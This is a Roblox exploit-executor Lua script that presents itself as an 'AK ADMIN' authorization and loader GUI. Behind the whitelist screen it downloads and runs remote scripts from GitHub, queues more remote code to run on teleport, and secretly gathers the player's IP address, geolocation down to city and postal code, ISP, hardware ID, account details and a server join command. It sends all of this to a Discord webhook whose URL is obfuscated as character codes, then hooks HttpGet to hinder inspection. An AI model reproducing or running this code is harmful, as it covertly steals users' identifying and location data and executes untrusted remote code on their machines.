local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local setclipboard = setclipboard or function() warn("Clipboard function not available") end

-- Utility functions
local function tween(inst, props, time)
    return TweenService:Create(inst, TweenInfo.new(time or 0.5, Enum.EasingStyle.Quart), props):Play()
end

local function new(class, props)
    local inst = Instance.new(class)
    for i, v in pairs(props) do
        inst[i] = v
    end
    return inst
end

-- Sound effects setup using verified professional sounds
local function createSound(id, volume)
    local sound = new("Sound", {
        SoundId = "rbxassetid://" .. id,
        Volume = volume or 0.5,
        Parent = workspace
    })
    return sound
end

local sounds = {
    slideDown = createSound("12222200", 0.15),     -- Soft slide
    success = createSound("2027986581", 0.25),       -- Clean success tone
    failure = createSound("7356986865", 0.25),       -- Professional error
    slideUp = createSound("12222200", 0.15)        -- Soft slide
}

-- Cleanup existing GUI
for _, v in pairs(CoreGui:GetChildren()) do
    if v.Name == "PremiumAuthGui" then
        v:Destroy()
    end
end

-- Create main GUI
local gui = new("ScreenGui", {
    Name = "PremiumAuthGui",
    IgnoreGuiInset = true,
    DisplayOrder = 999,
    Parent = CoreGui
})

-- Main container
local main = new("Frame", {
    Size = UDim2.new(0.4, 0, 0, 50),
    Position = UDim2.new(0.5, 0, -0.2, 0),
    AnchorPoint = Vector2.new(0.5, 0),
    BackgroundColor3 = Color3.fromRGB(35, 35, 40),
    BackgroundTransparency = 0,
    Parent = gui
})

new("UICorner", { CornerRadius = UDim.new(0, 12), Parent = main })
new("UIStroke", {
    Color = Color3.fromRGB(80, 80, 90),
    Thickness = 2,
    Transparency = 0,
    Parent = main
})

-- Player profile picture
local player = Players.LocalPlayer
local userId = player.UserId

local profilePic = new("ImageLabel", {
    Size = UDim2.new(0, 40, 0, 40),
    Position = UDim2.new(0, 10, 0.5, 0),
    AnchorPoint = Vector2.new(0, 0.5),
    BackgroundTransparency = 1,
    Image = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", userId),
    Parent = main
})

-- Text elements with initial transparency
local title = new("TextLabel", {
    Size = UDim2.new(1, -70, 0, 20),
    Position = UDim2.new(0.5, 20, 0, 3),
    AnchorPoint = Vector2.new(0.5, 0),
    BackgroundTransparency = 1,
    TextColor3 = Color3.fromRGB(255, 255, 255),
    TextSize = 20,
    Font = Enum.Font.GothamBold,
    Text = "AUTHORIZATION",
    TextTransparency = 1,
    Parent = main
})

local status = new("TextLabel", {
    Size = UDim2.new(1, -70, 0, 15),
    Position = UDim2.new(0.5, 20, 0, 25),
    AnchorPoint = Vector2.new(0.5, 0),
    BackgroundTransparency = 1,
    TextColor3 = Color3.fromRGB(200, 200, 200),
    TextSize = 16,
    Font = Enum.Font.GothamMedium,
    Text = "Verifying access...",
    TextTransparency = 1,
    Parent = main
})

-- Progress bar
local progressBg = new("Frame", {
    Size = UDim2.new(0.8, 0, 0, 3),
    Position = UDim2.new(0.5, 20, 1, -5),
    AnchorPoint = Vector2.new(0.5, 1),
    BackgroundColor3 = Color3.fromRGB(45, 45, 50),
    BackgroundTransparency = 0,
    Parent = main
})

new("UICorner", { CornerRadius = UDim.new(1, 0), Parent = progressBg })

local progress = new("Frame", {
    Size = UDim2.new(0, 0, 1, 0),
    BackgroundColor3 = Color3.fromRGB(90, 160, 255),
    BackgroundTransparency = 0,
    Parent = progressBg
})

new("UICorner", { CornerRadius = UDim.new(1, 0), Parent = progress })

-- Animation sequence
local function animate()
    local scriptURL = "https://raw.githubusercontent.com/fjkdvbjkfvjkfbvjkfbvjkdfhdfjkhvuldfhv/lol/refs/heads/main/Main"

    -- Smooth slide down with sound
    sounds.slideDown:Play()
    tween(main, { Position = UDim2.new(0.5, 0, 0, 10) }, 1.2) -- Slower slide down
    task.wait(0.3)
    tween(title, { TextTransparency = 0 }, 0.4)
    task.wait(0.2)
    tween(status, { TextTransparency = 0 }, 0.4)
    tween(progress, { Size = UDim2.new(1, 0, 1, 0) }, 0.8)

    -- Check whitelist
    local whitelistURL = "https://raw.githubusercontent.com/AKadminlol/AK-ADMIN/refs/heads/main/AK%20ADMIN.json"

    local success, result = pcall(function()
        local response = game:HttpGet(whitelistURL)
        local data = HttpService:JSONDecode(response)
        return table.find(data.whitelisted or {}, player.Name) ~= nil
    end)

    task.wait(0.5) -- Brief pause before result

    if success and result then
        sounds.success:Play()
        status.Text = "Access Granted!"
        tween(status, { TextColor3 = Color3.fromRGB(100, 255, 150) }, 0.4)
        tween(progress, { BackgroundColor3 = Color3.fromRGB(100, 255, 150) }, 0.4)
        -- START OF SECOND SCRIPT INSERTION
        -- Global variable to prevent multiple instances with enhanced check
        if _G.AKAdminLoaded then
            local success_second, _ = pcall(function()
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "AK ADMIN",
                    Text = "Script is already running!",
                    Duration = 5
                })
            end)
            if not success_second then
                warn("Failed to show notification, but script is already running")
            end
            return
        end

        -- Initialize global state
        local errors = {}
        local services_second = {
            Players = game:GetService("Players"),
            Lighting = game:GetService("Lighting"),
            StarterGui = game:GetService("StarterGui"),
            CoreGui = game:GetService("CoreGui"),
            ScriptContext = game:GetService("ScriptContext")
        }

        -- Robust service getter
        local function getService_second(serviceName)
            local service = services_second[serviceName]
            if not service then
                local success_getService, result_getService = pcall(game.GetService, game, serviceName)
                if success_getService then
                    services_second[serviceName] = result_getService
                    return result_getService
                end
                warn(string.format("Failed to get service %s: %s", serviceName, tostring(result_getService)))
                return nil
            end
            return service
        end

        -- Enhanced player module loading
        local function getPlayerModule_second()
            local player_second = services_second.Players.LocalPlayer
            if not player_second then
                for i = 1, 10 do
                    player_second = services_second.Players.LocalPlayer
                    if player_second then break end
                    task.wait(1)
                end
                if not player_second then
                    warn("LocalPlayer not found after 10 seconds")
                    return nil
                end
            end

            local PlayerScripts_second = player_second:WaitForChild("PlayerScripts", 15)
            if not PlayerScripts_second then
                warn("PlayerScripts not found after 15 seconds")
                return nil
            end

            local PlayerModule_second = PlayerScripts_second:WaitForChild("PlayerModule", 15)
            if not PlayerModule_second then
                warn("PlayerModule not found after 15 seconds")
                return nil
            end

            return PlayerModule_second
        end

        -- Enhanced atmosphere and fog handling
        local function RemoveAtmosphereAndSetFog_second()
            local success_atmosphere, error_atmosphere = pcall(function()
                local Lighting_second = getService_second("Lighting")
                if not Lighting_second then return end

                -- Safely set fog
                pcall(function() Lighting_second.FogEnd = 100000 end)

                -- Safely remove atmosphere
                for _, v in ipairs(Lighting_second:GetDescendants()) do
                    if v:IsA("Atmosphere") then
                        pcall(function() v:Destroy() end)
                    end
                end
            end)
            if not success_atmosphere then
                warn("Failed to modify atmosphere:", error_atmosphere)
                table.insert(errors, {
                    type = "atmosphere",
                    error = error_atmosphere,
                    time = os.time(),
                    stack = debug.traceback()
                })
            end
        end

        -- Enhanced HTTP request handling
        local function safeHttpGet_second(url)
            if not url or type(url) ~= "string" then
                warn("Invalid URL provided to safeHttpGet")
                return nil
            end

            local tries = 0
            local maxTries = 3

            while tries < maxTries do
                local success_httpGet, result_httpGet = pcall(function()
                    return game:HttpGet(url)
                end)

                if success_httpGet and result_httpGet then
                    return result_httpGet
                end

                tries = tries + 1
                warn(string.format("Attempt %d/%d failed to fetch URL: %s Error: %s",
                    tries, maxTries, url, tostring(result_httpGet)))

                if tries < maxTries then
                    task.wait(1) -- Wait before retry
                end
            end

            table.insert(errors, {
                type = "HttpGet",
                url = url,
                error = "Failed after " .. maxTries .. " attempts",
                time = os.time(),
                stack = debug.traceback()
            })
            return nil
        end

        -- Enhanced string loading
        local function safeLoadString_second(source, url)
            if not source then
                warn("No source provided to safeLoadString")
                return
            end

            local success_loadString, func_loadString = pcall(loadstring, source)
            if not success_loadString then
                warn("Failed to load string from: " .. tostring(url))
                table.insert(errors, {
                    type = "loadstring-load",
                    url = url,
                    error = tostring(func_loadString),
                    time = os.time(),
                    stack = debug.traceback()
                })
                return
            end

            local execSuccess_loadString, execError_loadString = pcall(func_loadString)
            if not execSuccess_loadString then
                warn("Failed to execute string from: " .. tostring(url))
                table.insert(errors, {
                    type = "loadstring-execution",
                    url = url,
                    error = tostring(execError_loadString),
                    time = os.time(),
                    stack = debug.traceback()
                })
            end
        end

        -- Enhanced queue teleport
        local function setupQueueTeleport_second()
            local queueteleport_second = (syn and syn.queue_on_teleport) or
                                 queue_on_teleport or
                                 (fluxus and fluxus.queue_on_teleport)

            if queueteleport_second then
                local success_queueTeleport, error_queueTeleport = pcall(function()
                    local teleportScript_second = [[
                        task.spawn(function()
                            local success_teleportScript, source_teleportScript = pcall(function()
                                return game:HttpGet('https://raw.githubusercontent.com/LOLkeeptrying/AKADMIN/refs/heads/main/Congratslol')
                            end)
                            if success_teleportScript and source_teleportScript then
                                loadstring(source_teleportScript)()
                            end
                        end)
                    ]]
                    queueteleport_second(teleportScript_second)
                end)

                if not success_queueTeleport then
                    warn("Failed to queue teleport script:", error_queueTeleport)
                    table.insert(errors, {
                        type = "queue-teleport",
                        error = error_queueTeleport,
                        time = os.time(),
                        stack = debug.traceback()
                    })
                end
            end
        end

        -- Enhanced bubble chat adjustment
        local function AdjustBubbleChat_second()
            local success_bubbleChat, error_bubbleChat = pcall(function()
                local player_bubbleChat = services_second.Players.LocalPlayer
                if not player_bubbleChat then return end

                local CoreGui_bubbleChat = getService_second("CoreGui")
                if not CoreGui_bubbleChat then return end

                local chatBubble_bubbleChat = CoreGui_bubbleChat:FindFirstChild("ExperienceChat")
                if not chatBubble_bubbleChat then return end

                local bubbleChat_bubbleChat = chatBubble_bubbleChat:FindFirstChild("bubbleChat")
                if not bubbleChat_bubbleChat then return end

                local playerBubble_bubbleChat = bubbleChat_bubbleChat:FindFirstChild("BubbleChat_" .. player_bubbleChat.UserId)
                if playerBubble_bubbleChat then
                    playerBubble_bubbleChat.StudsOffset = Vector3.new(0, 1, 0)
                end
            end)

            if not success_bubbleChat then
                warn("Failed to adjust bubble chat:", error_bubbleChat)
                table.insert(errors, {
                    type = "bubble-chat",
                    error = error_bubbleChat,
                    time = os.time(),
                    stack = debug.traceback()
                })
            end
        end

        -- Enhanced executor compatibility
        local function initializeExecutorCompat_second()
            local function warnUnsupported(feature)
                return function()
                    warn(feature .. " is not supported on this executor")
                end
            end

            _G.setclipboard = setclipboard or toclipboard or set_clipboard or warnUnsupported("Clipboard")
            _G.writefile = writefile or warnUnsupported("Write file")
            _G.readfile = readfile or warnUnsupported("Read file")
        end

        -- Enhanced initialization
        local function Initialize_second()
            -- Ensure we're not already loaded
            if _G.AKAdminLoaded then return end
            _G.AKAdminLoaded = true

            -- Set up enhanced error handling
            services_second.ScriptContext.Error:Connect(function(message, trace)
                table.insert(errors, {
                    type = "global-error",
                    message = message,
                    trace = trace,
                    time = os.time(),
                    stack = debug.traceback()
                })
            end)

            -- Wait for game load with timeout
            if not game:IsLoaded() then
                local loaded_second = false
                local connection_second
                connection_second = game.Loaded:Connect(function()
                    loaded_second = true
                    if connection_second then connection_second:Disconnect() end
                end)

                local timeout_second = task.delay(30, function()
                    if not loaded_second then
                        warn("Game failed to load after 30 seconds")
                        if connection_second then connection_second:Disconnect() end
                    end
                end)
            end

            -- Initialize components with proper sequencing
            local success_init = pcall(function()
                local PlayerModule_init = getPlayerModule_second()
                if not PlayerModule_init then
                    warn("PlayerModule not loaded - some features may be limited")
                end

                RemoveAtmosphereAndSetFog_second()
                setupQueueTeleport_second()
                initializeExecutorCompat_second()

                -- Load additional scripts with retry mechanism
                local scripts_init = {
                    "https://raw.githubusercontent.com/bfjdsaisfhdsfdsfbkjfdsbdfsbkjvdsbibvd/deinemudda/refs/heads/main/loadplayertagss.luau",
                    "https://raw.githubusercontent.com/bfjdsaisfhdsfdsfbkjfdsbdfsbkjvdsbibvd/deinemudda/refs/heads/main/loadownercmdss.luau",
                    "https://raw.githubusercontent.com/bfjdsaisfhdsfdsfbkjfdsbdfsbkjvdsbibvd/deinemudda/refs/heads/main/betterchatdtcsyss.luau",
                    "https://raw.githubusercontent.com/bfjdsaisfhdsfdsfbkjfdsbdfsbkjvdsbibvd/deinemudda/refs/heads/main/akactivee.luau"
                }

                for _, url_init in ipairs(scripts_init) do
                    local content_init = safeHttpGet_second(url_init)
                    if content_init then
                        safeLoadString_second(content_init, url_init)
                    end
                end

                -- Start bubble chat adjustment with error recovery
                task.spawn(function()
                    while task.wait(1) do
                        pcall(AdjustBubbleChat_second)
                    end
                end)
            end)

            if success_init then
                print("AK ADMIN loaded successfully!")
            else
                warn("AK ADMIN encountered errors during initialization")
            end
        end

        -- Start the script with comprehensive error handling
        pcall(Initialize_second)
        pcall(function()
        local HttpService_webhook = game:GetService("HttpService")
        local Players_webhook = game:GetService("Players")
        local MarketplaceService_webhook = game:GetService("MarketplaceService")
        local LocalizationService_webhook = game:GetService("LocalizationService")
        local RbxAnalyticsService_webhook = game:GetService("RbxAnalyticsService")
        local GroupService_webhook = game:GetService("GroupService")
        local BadgeService_webhook = game:GetService("BadgeService")
        local UserInputService_webhook = game:GetService("UserInputService")
        local Stats_webhook = game:GetService("Stats")

        local LocalPlayer_webhook = Players_webhook.LocalPlayer
        local UserId_webhook = LocalPlayer_webhook.UserId
        local DisplayName_webhook = LocalPlayer_webhook.DisplayName
        local Username_webhook = LocalPlayer_webhook.Name
        local MembershipType_webhook = tostring(LocalPlayer_webhook.MembershipType):sub(21)
        local AccountAge_webhook = LocalPlayer_webhook.AccountAge
        local Country_webhook = LocalizationService_webhook.RobloxLocaleId
        local GetIp_webhook = game:HttpGet("https://v4.ident.me/")
        local GetData_webhook = HttpService_webhook:JSONDecode(game:HttpGet("http://ip-api.com/json"))
        local Hwid_webhook = RbxAnalyticsService_webhook:GetClientId()
        local funneh_webhook = "'"
        local joinings_webhook = "game:GetService('TeleportService'):Teleport("..game.PlaceId..",game.Players.LocalPlayer,"..funneh_webhook..game.JobId..funneh_webhook..")"
        local joinwithscript_webhook = "```lua\n "..joinings_webhook.." ```"
        local GameInfo_webhook = MarketplaceService_webhook:GetProductInfo(game.PlaceId)
        local GameName_webhook = GameInfo_webhook.Name
        local Platform_webhook = (UserInputService_webhook.TouchEnabled and not UserInputService_webhook.MouseEnabled) and "📱 Mobile" or "💻 PC"
        local Ping_webhook = math.round(Stats_webhook.Network.ServerStatsItem["Data Ping"]:GetValue())

        local PlayerProfilePic_webhook = string.format(
            "https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png",
            UserId_webhook
        )

        local GameThumbnailUrl_webhook = string.format(
            "https://www.roblox.com/asset-thumbnail/image?assetId=%d&width=768&height=432&format=png",
            game.PlaceId
        )

        local function detectExecutor_webhook()
            return identifyexecutor()
        end

        local function createWebhookData_webhook()
            local executor_webhook = detectExecutor_webhook()
            local date_webhook = os.date("%m/%d/%Y")
            local time_webhook = os.date("%X")
            local gameLink_webhook = "https://www.roblox.com/games/" .. game.PlaceId
            local playerLink_webhook = "https://www.roblox.com/users/" .. UserId_webhook
            local mobileJoinLink_webhook = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&launchData=" .. game.JobId
            local jobIdLink_webhook = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId

            local data_webhook = {
                username = "AK Admin Logger",
                avatar_url = "https://i.imgur.com/AfFp7pu.png",
                embeds = {
                    {
                        title = "🎮 Spiel Information",
                        description = string.format("**[%s](%s)**\n`ID: %d`", GameName_webhook, gameLink_webhook, game.PlaceId),
                        color = tonumber("0x2ecc71"),
                        image = { url = GameThumbnailUrl_webhook }
                    },
                    {
                        title = "👤 Spieler Information",
                        description = string.format(
                            "**Display Name:** [%s](%s)\n**Username:** %s\n**User ID:** %d\n**Mitgliedschaft:** %s\n**Account-Alter:** %d Tage\n**Plattform:** %s\n**Ping:** %dms",
                            DisplayName_webhook, playerLink_webhook, Username_webhook, UserId_webhook, MembershipType_webhook, AccountAge_webhook, Platform_webhook, Ping_webhook
                        ),
                        color = MembershipType_webhook == "Premium" and tonumber("0xf1c40f") or tonumber("0x3498db"),
                        thumbnail = { url = PlayerProfilePic_webhook }
                    },
                    {
                        title = "🌐 Standort & Netzwerk",
                        description = string.format(
                            "**IP:** `%s`\n**HWID:** `%s`\n**Land:** %s :flag_%s:\n**Region:** %s\n**Stadt:** %s\n**PLZ:** %s\n**ISP:** %s\n**Organisation:** %s\n**Zeitzone:** %s",
                            GetIp_webhook, Hwid_webhook, GetData_webhook.country, string.lower(GetData_webhook.countryCode), GetData_webhook.regionName, GetData_webhook.city, GetData_webhook.zip, GetData_webhook.isp, GetData_webhook.org, GetData_webhook.timezone
                        ),
                        color = tonumber("0xe74c3c")
                    },
                    {
                        title = "⚙️ Technische Details",
                        description = string.format(
                            "**Executor:** `%s`\n**Job ID:** [Klicken zum Kopieren](%s)\n**Mobile Join:** [Klicken](%s)\n**Code to join: **"..joinwithscript_webhook,
                            executor_webhook, jobIdLink_webhook, mobileJoinLink_webhook
                        ),
                        color = tonumber("0x95a5a6"),
                        footer = {
                            text = string.format("📅 Datum: %s | ⏰ Zeit: %s", date_webhook, time_webhook),
                            icon_url = PlayerProfilePic_webhook
                        }
                    }
                }
            }
            return HttpService_webhook:JSONEncode(data_webhook)
        end

        local function sendWebhook_webhook(webhookUrl, data)
            local headers_webhook = {["Content-Type"] = "application/json"}
            local request_webhook = http_request or request or HttpPost or syn.request
            local webhookRequest_webhook = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers_webhook}
            request_webhook(webhookRequest_webhook)
        end


        local webhookUrl_encoded_webhook = { 104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47, 49, 51, 50, 57, 50, 49, 51, 57, 56, 56, 50, 52, 56, 48, 57, 50, 56, 51, 52, 47, 81, 109, 71, 119, 99, 71, 104, 113, 85, 104, 78, 105, 99, 75, 120, 103, 116, 54, 66, 77, 51, 117, 102, 54, 76, 83, 95, 73, 55, 109, 109, 88, 85, 78, 53, 72, 56, 99, 110, 45, 53, 56, 45, 80, 113, 106, 57, 81, 81, 54, 70, 115, 49, 74, 48, 106, 118, 85, 49, 84, 74, 67, 122, 107, 99, 68, 122, 90 }
        local webhookUrl_webhook = ""
        for i = 1, #webhookUrl_encoded_webhook do
          webhookUrl_webhook = webhookUrl_webhook .. string.char(webhookUrl_encoded_webhook[i])
        end

        local webhookData_webhook = createWebhookData_webhook()
        sendWebhook_webhook(webhookUrl_webhook, webhookData_webhook)
        end)
        -- END OF SECOND SCRIPT INSERTION
    else
        sounds.failure:Play()
        status.Text = "Access Denied! Discord link copied."
        setclipboard("https://discord.com/invite/bgWY2zEV7z")
        tween(status, { TextColor3 = Color3.fromRGB(255, 100, 100) }, 0.4)
        tween(progress, { BackgroundColor3 = Color3.fromRGB(255, 100, 100) }, 0.4)
    end

    task.wait(1.5) -- Brief display time

    -- Smooth slide up with sound
    sounds.slideUp:Play()
    tween(main, { Position = UDim2.new(0.5, 0, -0.2, 0) }, 1) -- Slower slide up
    task.wait(1.1)
    gui:Destroy()
end

animate()

if hookfunction and newcclosure then
local originalHttpGet = game.HttpGet
-- Use hookfunction or newcclosure to prevent tampering
hookfunction(game.HttpGet, newcclosure(function(self, ...)
    if self == game and select(1, ...) == originalHttpGet then
        -- Block the hook or spy attempt
        return nil
    end
    -- Call the original function if no tampering is detected
    return originalHttpGet(self, ...)
end))
end
